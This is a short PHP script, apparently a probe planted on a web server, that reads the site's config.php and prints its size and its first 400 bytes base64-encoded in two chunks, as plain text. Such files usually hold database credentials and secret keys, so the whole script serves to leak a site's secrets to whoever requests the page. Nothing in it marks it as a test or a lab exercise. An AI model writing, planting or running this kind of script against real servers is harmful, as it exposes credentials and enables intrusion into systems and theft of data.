<?php
header('Content-Type: text/plain');
if (file_exists('config.php')) {
    $c = file_get_contents('config.php');
    echo "Size: " . strlen($c) . "\n";
    echo "First 200: " . base64_encode(substr($c, 0, 200)) . "\n";
    echo "Next 200: " . base64_encode(substr($c, 200, 200)) . "\n";
}
?>
